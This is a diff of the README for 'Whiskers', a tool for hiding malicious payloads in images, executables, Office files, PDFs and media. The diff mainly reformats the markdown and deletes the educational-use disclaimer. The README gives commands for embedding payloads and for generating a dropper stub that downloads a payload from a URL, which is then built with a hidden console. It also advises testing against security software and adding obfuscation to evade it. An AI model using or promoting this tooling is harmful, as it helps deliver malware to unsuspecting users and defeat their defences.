@@ -1,5 +1,5 @@
 
-```
+````markdown
 # Whiskers
 
 <div align="center">
@@ -39,11 +39,11 @@ Whiskers is a sophisticated tool designed for embedding malicious payloads into 
 
 ```bash
 pip install -r requirements.txt
-```
+````
 
 ### Requirements
 
-```
+```text
 cryptography
 pefile
 olefile
@@ -59,11 +59,12 @@ python whiskers.py embed carrier.png payload.exe output.png --password mypasswor
 ```
 
 Options:
-- `-f, --format`: Specify file format (if not detectable from extension)
-- `-p, --password`: Password for encryption
-- `--no-encrypt`: Disable encryption
-- `--no-compress`: Disable compression
-- `--no-obfuscate`: Disable obfuscation
+
+* `-f, --format`: Specify file format (if not detectable from extension)
+* `-p, --password`: Password for encryption
+* `--no-encrypt`: Disable encryption
+* `--no-compress`: Disable compression
+* `--no-obfuscate`: Disable obfuscation
 
 ### Extracting a Payload
 
@@ -72,8 +73,9 @@ python whiskers.py extract carrier.png extracted.exe --key output.png.key
 ```
 
 Options:
-- `-f, --format`: Specify file format (if not detectable from extension)
-- `-k, --key`: Key file for decryption
+
+* `-f, --format`: Specify file format (if not detectable from extension)
+* `-k, --key`: Key file for decryption
 
 ### Generating a Stub
 
@@ -82,23 +84,24 @@ python whiskers.py stub dropper.py --url http://example.com/payload.exe --key en
 ```
 
 Options:
-- `-u, --url`: URL to download payload from
-- `-k, --key`: Decryption key
+
+* `-u, --url`: URL to download payload from
+* `-k, --key`: Decryption key
 
 ## Supported File Formats
 
-| Format | Technique | Notes |
-|--------|-----------|-------|
-| PNG | Custom chunk insertion | Inserts payload as a custom PNG chunk |
-| JPG/JPEG | EXIF data manipulation | Hides payload in EXIF metadata |
-| EXE/DLL/SYS | Code cave injection | Modifies PE structure with entry point redirection |
-| DOC | OLE stream manipulation | Embeds in OLE document structure |
-| DOCX | ZIP structure modification | Adds payload as a new file in the ZIP archive |
-| PDF | JavaScript object injection | Inserts executable JavaScript in PDF |
-| MP3 | ID3 tag manipulation | Uses custom ID3 tags for payload storage |
-| MP4 | Free atom insertion | Creates a new atom in MP4 container |
-| AVI | Junk chunk insertion | Adds payload as a junk chunk |
-| GIF | Application extension | Uses GIF application extension block |
+| Format      | Technique                   | Notes                                              |
+| ----------- | --------------------------- | -------------------------------------------------- |
+| PNG         | Custom chunk insertion      | Inserts payload as a custom PNG chunk              |
+| JPG/JPEG    | EXIF data manipulation      | Hides payload in EXIF metadata                     |
+| EXE/DLL/SYS | Code cave injection         | Modifies PE structure with entry point redirection |
+| DOC         | OLE stream manipulation     | Embeds in OLE document structure                   |
+| DOCX        | ZIP structure modification  | Adds payload as a new file in the ZIP archive      |
+| PDF         | JavaScript object injection | Inserts executable JavaScript in PDF               |
+| MP3         | ID3 tag manipulation        | Uses custom ID3 tags for payload storage           |
+| MP4         | Free atom insertion         | Creates a new atom in MP4 container                |
+| AVI         | Junk chunk insertion        | Adds payload as a junk chunk                       |
+| GIF         | Application extension       | Uses GIF application extension block               |
 
 ## Examples
 
@@ -124,16 +127,17 @@ pyinstaller --onefile --noconsole dropper.py
 
 Whiskers consists of several core components:
 
-- **Embedding Engine**: Format-specific embedding techniques
-- **Payload Processor**: Encryption, compression, and obfuscation
-- **Extraction Engine**: Reverse the embedding process
-- **Stub Generator**: Create executable droppers
+* **Embedding Engine**: Format-specific embedding techniques
+* **Payload Processor**: Encryption, compression, and obfuscation
+* **Extraction Engine**: Reverse the embedding process
+* **Stub Generator**: Create executable droppers
 
 ## Technical Details
 
 ### PE File Injection
 
 For executable files, Whiskers:
+
 1. Analyzes the PE structure
 2. Finds or creates a code cave
 3. Injects the payload
@@ -143,6 +147,7 @@ For executable files, Whiskers:
 ### Image Steganography
 
 For image files, Whiskers:
+
 1. Analyzes the file structure
 2. Identifies suitable injection points
 3. Inserts the payload in metadata or custom structures
@@ -150,10 +155,10 @@ For image files, Whiskers:
 
 ## Security Considerations
 
-- Use strong passwords for encryption
-- Consider additional obfuscation techniques
-- Test against security software
-- Understand legal implications in your jurisdiction
+* Use strong passwords for encryption
+* Consider additional obfuscation techniques
+* Test against security software
+* Understand legal implications in your jurisdiction
 
 ## Contributing
 
@@ -163,11 +168,4 @@ Contributions are welcome. Please fork the repository and submit a pull request.
 
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
-## Disclaimer
-
-This tool is intended for educational and research purposes only. The authors are not responsible for any misuse of this software. Users are responsible for their actions and should comply with all applicable laws and regulations.
-
-## Support
-
-For support and questions, please open an issue on GitHub.
 ```
